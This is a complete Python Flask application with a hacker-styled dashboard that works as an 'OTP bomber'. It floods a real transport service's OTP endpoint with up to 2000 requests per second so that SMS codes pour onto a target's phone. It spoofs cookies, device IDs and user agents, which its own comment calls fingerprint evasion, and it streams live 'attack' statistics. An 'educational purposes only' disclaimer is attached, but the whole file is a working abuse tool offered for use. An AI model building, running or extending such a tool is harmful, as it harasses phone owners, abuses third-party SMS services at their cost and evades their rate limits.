# kimu_bhai_bomb_api.py - Complete Single File Flask API with SSE
# Developed by ERROR - Ultimate OTP Bomber API

from flask import Flask, request, jsonify, Response, render_template_string
from flask_cors import CORS
import requests
import json
import time
import threading
import random
import string
import uuid
from collections import defaultdict
from datetime import datetime
import queue

app = Flask(__name__)
CORS(app)

# Store active bombing sessions
active_sessions = {}
sessions_lock = threading.Lock()

# HTML Dashboard Template
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KIMU BHAI BOMB - OTP Blaster API</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 30px;
            border-bottom: 2px solid #00ff00;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 3em;
            text-shadow: 0 0 10px #00ff00;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #00ff00; }
            to { text-shadow: 0 0 20px #00ff00; }
        }
        
        .developer {
            color: #ff6600;
            margin-top: 10px;
            font-size: 0.9em;
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            backdrop-filter: blur(10px);
        }
        
        .card h2 {
            color: #00ff00;
            margin-bottom: 20px;
            border-left: 3px solid #00ff00;
            padding-left: 10px;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
        }
        
        input, select {
            width: 100%;
            padding: 10px;
            background: #0a0a0a;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            font-family: monospace;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00cc00;
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        
        button.stop {
            background: #ff0000;
            color: white;
        }
        
        button.stop:hover {
            background: #cc0000;
        }
        
        .stats {
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .stat-item {
            display: inline-block;
            margin: 10px;
            padding: 10px;
            background: rgba(0, 255, 0, 0.1);
            border-radius: 5px;
            min-width: 150px;
        }
        
        .stat-label {
            font-size: 12px;
            color: #888;
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
        }
        
        .log-container {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            height: 400px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }
        
        .log-entry {
            padding: 5px;
            border-bottom: 1px solid #1a1a1a;
            color: #00ff00;
        }
        
        .log-error {
            color: #ff4444;
        }
        
        .log-success {
            color: #00ff00;
        }
        
        .log-warning {
            color: #ffaa00;
        }
        
        .api-docs {
            margin-top: 30px;
        }
        
        .endpoint {
            background: #0a0a0a;
            padding: 15px;
            margin: 10px 0;
            border-left: 3px solid #00ff00;
            font-family: monospace;
        }
        
        .method {
            color: #ffaa00;
            font-weight: bold;
        }
        
        .url {
            color: #00ff00;
        }
        
        .status-active {
            color: #00ff00;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 KIMU BHAI BOMB 🔥</h1>
            <div class="developer">Developed by ERROR | Ultimate OTP Blaster API</div>
            <div style="font-size: 12px; margin-top: 10px;">⚠️ For Educational Purposes Only ⚠️</div>
        </div>
        
        <div class="grid">
            <div class="card">
                <h2>🎯 Attack Configuration</h2>
                <form id="bombForm">
                    <div class="input-group">
                        <label>📱 Phone Number</label>
                        <input type="tel" id="phone" placeholder="e.g., 9876543210" required>
                    </div>
                    <div class="input-group">
                        <label>🌍 Country Code</label>
                        <input type="text" id="countryCode" value="91" placeholder="91">
                    </div>
                    <div class="input-group">
                        <label>⏱️ Duration (seconds)</label>
                        <input type="number" id="duration" value="60" placeholder="60" min="10" max="3600">
                    </div>
                    <div class="input-group">
                        <label>⚡ Threads (1-500)</label>
                        <input type="number" id="threads" value="100" min="1" max="500">
                    </div>
                    <div class="input-group">
                        <label>🚀 Speed (req/sec)</label>
                        <input type="number" id="speed" value="500" min="10" max="2000">
                    </div>
                    <button type="submit">💥 START BOMBING 💥</button>
                </form>
                <button id="stopBtn" class="stop" style="margin-top: 10px;">🛑 STOP ATTACK 🛑</button>
            </div>
            
            <div class="card">
                <h2>📊 Live Statistics</h2>
                <div id="stats">
                    <div class="stat-item">
                        <div class="stat-label">Status</div>
                        <div class="stat-value" id="status">Idle</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Total Requests</div>
                        <div class="stat-value" id="total">0</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Successful</div>
                        <div class="stat-value" id="success">0</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Failed</div>
                        <div class="stat-value" id="failed">0</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Speed (req/sec)</div>
                        <div class="stat-value" id="speedStat">0</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Success Rate</div>
                        <div class="stat-value" id="successRate">0%</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Time Remaining</div>
                        <div class="stat-value" id="timeRemaining">0s</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="stats">
            <h2>📝 Live Logs</h2>
            <div class="log-container" id="logs">
                <div class="log-entry">[INFO] Waiting for attack to start...</div>
            </div>
        </div>
        
        <div class="api-docs">
            <h2>📚 API Documentation</h2>
            <div class="endpoint">
                <span class="method">POST</span> <span class="url">/api/start</span><br>
                <small>Start a bombing attack</small><br>
                <small>Body: {"phone": "9876543210", "countryCode": "91", "duration": 60, "threads": 100, "speed": 500}</small>
            </div>
            <div class="endpoint">
                <span class="method">POST</span> <span class="url">/api/stop</span><br>
                <small>Stop current attack</small><br>
                <small>Body: {"sessionId": "session-uuid"}</small>
            </div>
            <div class="endpoint">
                <span class="method">GET</span> <span class="url">/api/status/&lt;sessionId&gt;</span><br>
                <small>Get attack status</small>
            </div>
            <div class="endpoint">
                <span class="method">GET</span> <span class="url">/api/stream/&lt;sessionId&gt;</span><br>
                <small>SSE stream for real-time updates</small>
            </div>
        </div>
    </div>
    
    <script>
        let eventSource = null;
        let currentSessionId = null;
        
        document.getElementById('bombForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const countryCode = document.getElementById('countryCode').value;
            const duration = parseInt(document.getElementById('duration').value);
            const threads = parseInt(document.getElementById('threads').value);
            const speed = parseInt(document.getElementById('speed').value);
            
            try {
                const response = await fetch('/api/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone, countryCode, duration, threads, speed})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    currentSessionId = data.sessionId;
                    addLog(`[SUCCESS] Attack started! Session: ${currentSessionId}`, 'success');
                    connectSSE(currentSessionId);
                } else {
                    addLog(`[ERROR] ${data.message}`, 'error');
                }
            } catch (error) {
                addLog(`[ERROR] ${error.message}`, 'error');
            }
        });
        
        document.getElementById('stopBtn').addEventListener('click', async () => {
            if (!currentSessionId) {
                addLog('[WARNING] No active attack to stop', 'warning');
                return;
            }
            
            try {
                const response = await fetch('/api/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({sessionId: currentSessionId})
                });
                
                const data = await response.json();
                if (data.success) {
                    addLog('[SUCCESS] Attack stopped!', 'success');
                    if (eventSource) {
                        eventSource.close();
                        eventSource = null;
                    }
                    document.getElementById('status').innerHTML = 'Stopped';
                }
            } catch (error) {
                addLog(`[ERROR] ${error.message}`, 'error');
            }
        });
        
        function connectSSE(sessionId) {
            if (eventSource) {
                eventSource.close();
            }
            
            eventSource = new EventSource(`/api/stream/${sessionId}`);
            
            eventSource.onmessage = function(event) {
                const data = JSON.parse(event.data);
                updateStats(data);
                if (data.log) {
                    addLog(data.log, data.logType);
                }
                if (data.completed) {
                    eventSource.close();
                    document.getElementById('status').innerHTML = 'Completed';
                }
            };
            
            eventSource.onerror = function() {
                addLog('[WARNING] SSE connection lost, reconnecting...', 'warning');
            };
        }
        
        function updateStats(data) {
            if (data.total !== undefined) document.getElementById('total').innerHTML = data.total;
            if (data.success !== undefined) document.getElementById('success').innerHTML = data.success;
            if (data.failed !== undefined) document.getElementById('failed').innerHTML = data.failed;
            if (data.speed !== undefined) document.getElementById('speedStat').innerHTML = data.speed;
            if (data.successRate !== undefined) document.getElementById('successRate').innerHTML = data.successRate + '%';
            if (data.timeRemaining !== undefined) document.getElementById('timeRemaining').innerHTML = data.timeRemaining + 's';
            if (data.status) document.getElementById('status').innerHTML = data.status;
        }
        
        function addLog(message, type = 'info') {
            const logContainer = document.getElementById('logs');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
            
            // Keep only last 100 logs
            while (logContainer.children.length > 100) {
                logContainer.removeChild(logContainer.firstChild);
            }
        }
    </script>
</body>
</html>
'''

# OTP Bomber Engine Class
class OTPBomber:
    def __init__(self, session_id, phone_number, country_code, duration, threads, speed):
        self.session_id = session_id
        self.phone_number = phone_number
        self.country_code = country_code
        self.duration = duration
        self.threads = threads
        self.speed = speed
        self.is_running = False
        self.thread_list = []
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'status_codes': defaultdict(int),
            'start_time': None,
            'end_time': None,
            'speed': 0
        }
        self.lock = threading.Lock()
        self.log_queue = queue.Queue()
        
    # Random generators for fingerprint evasion
    def random_string(self, length=32):
        return ''.join(random.choices(string.hexdigits.lower(), k=length))
    
    def random_number(self, length=10):
        return ''.join(random.choices(string.digits, k=length))
    
    def random_timestamp(self):
        return str(int(time.time() * 1000)) + str(random.randint(100, 999))
    
    def generate_random_cookies(self):
        distinct_id = self.random_string(32)
        device_id = self.random_string(36)
        ga_id = f"GA1.1.{self.random_number(8)}.{self.random_timestamp()}"
        timestamp = self.random_timestamp()
        
        mixpanel_data = {
            "distinct_id": distinct_id,
            "$device_id": device_id,
            "$initial_referrer": random.choice(["$direct", "https://google.com"]),
            "$initial_referring_domain": random.choice(["$direct", "google.com"]),
            "__mps": {},
            "__mpso": {},
            "__mpus": {},
            "__mpa": {},
            "__mpu": {},
            "__mpr": [],
            "__mpap": [],
            "$user_id": distinct_id,
            "clientSource": random.choice(["PWA", "APP", "WEB"]),
            "appVersionCode": str(random.randint(1000, 9999)),
            "selected language": random.choice(["English", "Hindi"]),
            "timeZone": "+05:30",
            "deviceId": distinct_id
        }
        
        cookies = {
            '_ga': ga_id,
            f'mp_{self.random_string(32)}_mixpanel': json.dumps(mixpanel_data),
            'session_id': self.random_string(24),
            'device_id': self.random_string(32)
        }
        
        return '; '.join([f'{k}={v}' for k, v in cookies.items()])
    
    def generate_headers(self):
        user_agents = [
            "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 Chrome/148.0.7778.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/147.0.7778.100 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; iPhone 15 Pro) AppleWebKit/537.36 Chrome/146.0.7778.80 Mobile Safari/537.36",
        ]
        
        user_agent = random.choice(user_agents)
        chrome_version = user_agent.split('Chrome/')[1].split(' ')[0] if 'Chrome/' in user_agent else '148.0.7778.120'
        chrome_major = chrome_version.split('.')[0]
        
        return {
            'User-Agent': user_agent,
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': f'"Chromium";v="{chrome_major}", "Android WebView";v="{chrome_major}"',
            'sec-ch-ua-mobile': '?1',
            'source': str(random.randint(1, 10)),
            'userid': f'+{self.country_code}-{self.phone_number}',
            'origin': 'https://chalo.com',
            'x-requested-with': random.choice(['mark.via.gp', 'com.chalo.app']),
            'referer': 'https://chalo.com/app/',
            'Cookie': self.generate_random_cookies()
        }
    
    def send_request(self):
        url = "https://chalo.com/app/api/chaukidar/v1/otp"
        payload = {
            "phoneNumber": self.phone_number,
            "countryCode": self.country_code,
            "templateId": "1f9mk"
        }
        headers = self.generate_headers()
        
        try:
            response = requests.post(url, json=payload, headers=headers, timeout=3)
            success = response.status_code == 200
            
            with self.lock:
                self.stats['total'] += 1
                if success:
                    self.stats['success'] += 1
                else:
                    self.stats['failed'] += 1
                self.stats['status_codes'][response.status_code] += 1
            
            return success, response.status_code
        except Exception as e:
            with self.lock:
                self.stats['total'] += 1
                self.stats['failed'] += 1
            return False, str(e)
    
    def worker(self):
        delay = 1 / self.speed if self.speed > 0 else 0.001
        while self.is_running:
            success, status = self.send_request()
            if random.random() < 0.01:  # Log 1% of requests
                log_type = 'success' if success else 'error'
                self.log_queue.put({
                    'message': f"Request sent - Status: {status}",
                    'type': log_type
                })
            time.sleep(delay)
    
    def stats_updater(self):
        start_time = time.time()
        last_update = start_time
        last_total = 0
        
        while self.is_running:
            time.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            
            with self.lock:
                current_total = self.stats['total']
                speed = current_total - last_total
                self.stats['speed'] = speed
                last_total = current_total
                
                success_rate = (self.stats['success'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
                
                # Send stats update
                self.log_queue.put({
                    'stats': {
                        'total': self.stats['total'],
                        'success': self.stats['success'],
                        'failed': self.stats['failed'],
                        'speed': speed,
                        'successRate': round(success_rate, 1),
                        'timeRemaining': max(0, self.duration - elapsed)
                    }
                })
            
            # Check if duration completed
            if elapsed >= self.duration:
                self.is_running = False
                self.log_queue.put({
                    'message': f"Attack completed! Total: {self.stats['total']} requests",
                    'type': 'success',
                    'completed': True
                })
                break
    
    def start(self):
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        # Start stats updater thread
        stats_thread = threading.Thread(target=self.stats_updater)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start worker threads
        for i in range(min(self.threads, 500)):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.thread_list.append(t)
        
        self.log_queue.put({
            'message': f"Attack started with {self.threads} threads, target speed: {self.speed} req/sec",
            'type': 'success'
        })
    
    def stop(self):
        self.is_running = False
        self.stats['end_time'] = time.time()
        self.log_queue.put({
            'message': "Attack stopped by user",
            'type': 'warning'
        })
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
            success_rate = (self.stats['success'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
            return {
                'total': self.stats['total'],
                'success': self.stats['success'],
                'failed': self.stats['failed'],
                'successRate': round(success_rate, 1),
                'speed': self.stats['speed'],
                'elapsed': round(elapsed, 1),
                'isRunning': self.is_running,
                'statusCodes': dict(self.stats['status_codes'])
            }

# API Routes
@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/start', methods=['POST'])
def start_attack():
    try:
        data = request.json
        phone = data.get('phone')
        country_code = data.get('countryCode', '91')
        duration = int(data.get('duration', 60))
        threads = min(int(data.get('threads', 100)), 500)
        speed = min(int(data.get('speed', 500)), 2000)
        
        if not phone or not phone.isdigit():
            return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
        
        session_id = str(uuid.uuid4())
        
        bomber = OTPBomber(session_id, phone, country_code, duration, threads, speed)
        
        with sessions_lock:
            active_sessions[session_id] = bomber
        
        bomber.start()
        
        return jsonify({
            'success': True,
            'sessionId': session_id,
            'message': f'Attack started for {phone}'
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    try:
        data = request.json
        session_id = data.get('sessionId')
        
        with sessions_lock:
            if session_id in active_sessions:
                active_sessions[session_id].stop()
                del active_sessions[session_id]
                return jsonify({'success': True, 'message': 'Attack stopped'})
            else:
                return jsonify({'success': False, 'message': 'Session not found'}), 404
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/status/<session_id>')
def get_status(session_id):
    with sessions_lock:
        if session_id in active_sessions:
            stats = active_sessions[session_id].get_stats()
            return jsonify({'success': True, 'stats': stats})
        else:
            return jsonify({'success': False, 'message': 'Session not found'}), 404

@app.route('/api/stream/<session_id>')
def stream_events(session_id):
    def event_stream():
        with sessions_lock:
            if session_id not in active_sessions:
                yield f"data: {json.dumps({'error': 'Session not found'})}\n\n"
                return
            bomber = active_sessions[session_id]
        
        while bomber.is_running:
            try:
                # Get log message with timeout
                log_data = bomber.log_queue.get(timeout=1)
                yield f"data: {json.dumps(log_data)}\n\n"
            except queue.Empty:
                # Send heartbeat
                yield f"data: {json.dumps({'heartbeat': True})}\n\n"
        
        # Send final stats
        final_stats = bomber.get_stats()
        yield f"data: {json.dumps({'completed': True, 'finalStats': final_stats})}\n\n"
    
    return Response(event_stream(), mimetype="text/event-stream")

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'active_sessions': len(active_sessions),
        'developer': 'ERROR',
        'version': '1.0.0'
    })

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     🔥 KIMU BHAI BOMB API - Developed by ERROR 🔥            ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  🚀 Server running at: http://localhost:5000                 ║
    ║  📊 Dashboard: http://localhost:5000                         ║
    ║  📚 API Docs: Built-in dashboard                             ║
    ║  ⚠️  For Educational Purposes Only                           ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    app.run(debug=False, host='0.0.0.0', port=5000, threaded=True)